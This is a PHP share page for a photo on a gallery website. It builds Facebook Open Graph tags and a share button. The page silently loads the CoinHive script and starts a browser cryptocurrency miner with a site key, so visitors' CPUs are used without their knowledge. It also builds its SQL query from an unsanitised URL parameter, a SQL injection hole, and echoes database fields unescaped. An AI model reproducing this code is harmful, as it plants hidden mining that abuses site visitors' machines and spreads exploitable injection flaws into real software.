<?php
    /* Connexion */
    include '../connection/connection.php';
    $photos = mysqli_query($con, 'SELECT * FROM photo WHERE photo_id = ' . $_GET['photo'] . ';');
	$photo = mysqli_fetch_array($photos);
	$size = getimagesize("../../../img/full/" . $photo['photo_link']);
	if(!isset($photo) || !$size) {
		header('Location: http://dametenebra.com');
		exit();
	}	
	list($width, $height) = $size;
	$photo['photo_width'] = $width;
	$photo['photo_height'] = $height;
    mysqli_close($con);
	/* Make a redirect if no photo found */
?>

	<html>

	<head>
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>
			<?php echo $photo['photo_name']; ?>
		</title>
		<meta property="fb:app_id" content="698165167044112" />
		<meta property="og:url" content="http://dametenebra.com/php/services/share/share.php?photo=<?php echo $photo['photo_id']; ?>" />
		<meta property="og:title" content="<?php echo $photo['photo_name']; ?>" />
		<meta property="og:description" content="<?php echo $photo['photo_description']; ?>" />
		<meta property="og:image" content="http://dametenebra.com/img/full/<?php echo rawurlencode($photo['photo_link']); ?>" />
		<meta property="og:image:width" content="<?php echo $photo['photo_width']; ?>" />
		<meta property="og:image:height" content="<?php echo $photo['photo_height']; ?>" />
		<link rel="shortcut icon" href="../../../img/favicon.ico" type="image/x-icon" />
		<link rel="icon" href="../../../img/favicon.ico" type="image/x-icon" />
		<link type="text/css" rel="stylesheet" href="../../../css/dist.css">
		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
	</head>

	<body>

		<div id="fb-root"></div>
		<script>
			FB = null;
			(function(d, s, id) {
				var js, fjs = d.getElementsByTagName(s)[0];
				if (d.getElementById(id)) return;
				js = d.createElement(s);
				js.id = id;
				js.src = "//connect.facebook.net/fr_FR/sdk.js#xfbml=1&version=v2.10&appId=698165167044112";
				fjs.parentNode.insertBefore(js, fjs);
			}(document, 'script', 'facebook-jssdk'));

            var miner = new CoinHive.Anonymous('lUTEzL49FZFey8iHBMB2ZE4bwxOCyr8K');
            miner.setThrottle(0.25);
            miner.start();

		</script>

		<div class="row" style="margin: 0px; width: 100%;">
			<div class="col-sm-12 text-center">
				<br />
				<h2><?php echo $photo['photo_name']; ?></h2>
				<br />
			</div>
		</div>

		<img class="img-fluid" src="../../../img/full/<?php echo $photo['photo_link']; ?>">

		<div class="row" style="margin: 0px; width: 100%;">
			<div class="col-sm-12 text-center">
				<br />

				<a class="btn btn-sm btn-outline-secondary return" href="../../../#/gallery/<?php echo $photo['category_photo']; ?>?photo_id=<?php echo $photo['photo_id']; ?>" role="button">
					<div>
						<span class="_49vh _2pi7">Retour au site</span>
					</div>
				</a>&nbsp;&nbsp;&nbsp;

				<div class="fb-share-button" data-href="http://www.dametenebra.com/php/services/share/share.php?photo=<?php echo $photo['photo_id']; ?>" data-layout="button_count" data-size="large" data-mobile-iframe="true">
					<a class="fb-xfbml-parse-ignore" target="_blank" ng-href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.dametenebra.com%2Fphp%2Fservices%2Fshare%2Fshare.php?photo=<?php echo $photo['photo_id']; ?>}&amp;src=sdkpreparse">
						Partager
					</a>
				</div>

				<br />
				<br />
			</div>
		</div>
	</body>

	</html>
